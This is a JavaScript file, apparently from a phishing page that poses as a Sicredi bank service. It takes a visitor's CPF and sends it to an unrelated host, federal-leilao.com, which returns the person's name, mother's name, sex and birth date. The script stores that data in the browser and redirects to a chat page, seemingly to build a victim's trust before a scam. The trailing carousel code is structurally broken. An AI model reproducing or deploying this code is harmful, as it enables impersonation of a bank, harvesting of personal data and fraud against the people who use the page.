document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");
  const dataNascimento = document.getElementById("dataNascimento");

  // Formatar CPF enquanto digita
  function formatCPF(input) {
    let value = (input.value || "").replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }

    input.value = value;
  }

  // Validar CPF completo
  function validarCPF(cpf) {
    cpf = (cpf || "").replace(/[^\d]+/g, "");
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

    let soma = 0, resto;
    for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf[9])) return false;

    soma = 0;
    for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;

    return resto === parseInt(cpf[10]);
  }

  function formatDate(dateString) {
    if (!dateString) return "Não informado";
    if (String(dateString).includes("/")) return dateString;
    if (String(dateString).length === 8) {
      return String(dateString).replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }
    return dateString;
  }

  // ==========================
  // CONSULTA CPF (SEM TIMEOUT)
  // ==========================
  async function consultarCPF(cpf) {
    const cpfLimpo = cpf.replace(/\D/g, "");

    consultaResultado.classList.remove("hidden");
    loadingInfo.classList.remove("hidden");
    userInfo.classList.add("hidden");
    errorInfo.classList.add("hidden");

    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });

    try {
      const response = await fetch(
        `https://federal-leilao.com/v1/contratediscordrev0ltz/${encodeURIComponent(cpfLimpo)}`,
        {
          method: "GET",
          headers: {
            "user-agent":
              "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          },
        }
      );

      const data = response.ok ? await response.json() : null;

      loadingInfo.classList.add("hidden");

      let nomeCompleto = "Cliente Sicredi";
      let nascimento = "";
      let sexo = "";
      let mae = "";

      if (data && data.status === 200) {
        nomeCompleto = data.nome || nomeCompleto;
        nascimento = data.nascimento || "";
        sexo = data.sexo || "";
        mae = data.mae || "";
      }

      nomeUsuario.textContent = nomeCompleto;
      cpfUsuario.textContent = cpfLimpo.replace(
        /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
        "$1.$2.$3-$4"
      );
      sexoUsuario.textContent = sexo || "Não informado";
      nomeMae.textContent = mae || "Não informado";
      if (dataNascimento) dataNascimento.textContent = formatDate(nascimento);

      const dadosUsuario = {
        nome: nomeCompleto,
        cpf: cpfLimpo,
        sexo,
        nomeMae: mae,
        dataNascimento: nascimento,
      };

      localStorage.setItem("cpf", cpfLimpo);
      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
      localStorage.setItem("nomeUsuario", nomeCompleto);
      localStorage.setItem("cpfUsuario", cpfLimpo);

      sessionStorage.setItem("cpf", cpfLimpo);
      sessionStorage.setItem("nomeCompleto", nomeCompleto);
      sessionStorage.setItem("primeiroNome", nomeCompleto.split(" ")[0]);
      sessionStorage.setItem("dataNascimento", nascimento || "");
      sessionStorage.setItem("sexo", sexo || "");
      sessionStorage.setItem("nomeMae", mae || "");

      userInfo.classList.remove("hidden");
      userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
    } catch (err) {
      loadingInfo.classList.add("hidden");
      errorMessage.textContent = "Erro ao consultar CPF. Tente novamente.";
      errorInfo.classList.remove("hidden");
      console.error(err);
    }
  }

  // Processar formulário
  function processForm() {
    const cpf = cpfInputPage.value.replace(/\D/g, "");

    if (!validarCPF(cpf)) {
      alert("CPF inválido.");
      return;
    }

    if (termsCheck && !termsCheck.checked) {
      alert("Aceite os termos para continuar.");
      return;
    }

    consultarCPF(cpf);
  }

  // Eventos
  btnAtivar?.addEventListener("click", () => cpfPage.classList.remove("hidden"));
  btnSimular?.addEventListener("click", () => cpfPage.classList.remove("hidden"));
  btnVoltar?.addEventListener("click", () => cpfPage.classList.add("hidden"));
  btnAnalisar?.addEventListener("click", processForm);
  btnConfirmar?.addEventListener("click", () => {
    window.location.href = "./chat/index.html";
  });
  btnCorrigir?.addEventListener("click", () => consultaResultado.classList.add("hidden"));
  btnTentarNovamente?.addEventListener("click", () => consultaResultado.classList.add("hidden"));

  cpfInputPage?.addEventListener("input", function () {
    formatCPF(this);
  });
});


  // ======================
  // Carrossel (igual antes)
  // ======================
  const carousel = document.getElementById("carousel");
  const slides = document.querySelectorAll(".carousel-item");
  const indicators = document.querySelectorAll(".carousel-indicator");
  const prevBtn = document.getElementById("prev-btn");
  const nextBtn = document.getElementById("next-btn");

  const stepNumbers = document.querySelectorAll(".step-number");
  const stepLines = document.querySelectorAll(".step-line");

  let currentSlide = 0;
  let autoSlideInterval;

  function showSlide(index) {
    if (!slides || slides.length === 0) return;

    if (index < 0) index = slides.length - 1;
    else if (index >= slides.length) index = 0;

    slides.forEach((slide) => slide.classList.remove("active"));
    slides[index].classList.add("active");

    indicators.forEach((indicator, i) => {
      if (i === index) indicator.classList.add("active");
      else indicator.classList.remove("active");
    });

    updateSteps(index);
    currentSlide = index;
  }

  function updateSteps(index) {
    stepNumbers.forEach((step, i) => {
      step.classList.remove("active", "completed");
      if (i === index) step.classList.add("active");
      else if (i < index) step.classList.add("completed");
    });

    stepLines.forEach((line, i) => {
      if (i < index) line.classList.add("active");
      else line.classList.remove("active");
    });
  }

  function nextSlide() {
    showSlide(currentSlide + 1);
    resetAutoSlide();
  }

  function prevSlide() {
    showSlide(currentSlide - 1);
    resetAutoSlide();
  }

  function startAutoSlide() {
    autoSlideInterval = setInterval(nextSlide, 5000);
  }

  function resetAutoSlide() {
    clearInterval(autoSlideInterval);
    startAutoSlide();
  }

  if (prevBtn && nextBtn && carousel && slides.length) {
    nextBtn.addEventListener("click", nextSlide);
    prevBtn.addEventListener("click", prevSlide);

    indicators.forEach((indicator, index) => {
      indicator.addEventListener("click", () => {
        showSlide(index);
        resetAutoSlide();
      });
    });

    stepNumbers.forEach((step) => {
      step.addEventListener("click", () => {
        const stepIndex = parseInt(step.getAttribute("data-step"), 10);
        if (!Number.isNaN(stepIndex)) {
          showSlide(stepIndex);
          resetAutoSlide();
        }
      });
    });

    let touchStartX = 0;

    carousel.addEventListener(
      "touchstart",
      (e) => {
        touchStartX = e.changedTouches[0].screenX;
      },
      { passive: true }
    );

    carousel.addEventListener(
      "touchend",
      (e) => {
        const touchEndX = e.changedTouches[0].screenX;
        const diff = touchEndX - touchStartX;

        if (diff > 50) prevSlide();
        else if (diff < -50) nextSlide();
      },
      { passive: true }
    );

    carousel.addEventListener("mouseenter", () => clearInterval(autoSlideInterval));
    carousel.addEventListener("mouseleave", startAutoSlide);

    showSlide(0);
    startAutoSlide();
  }
});
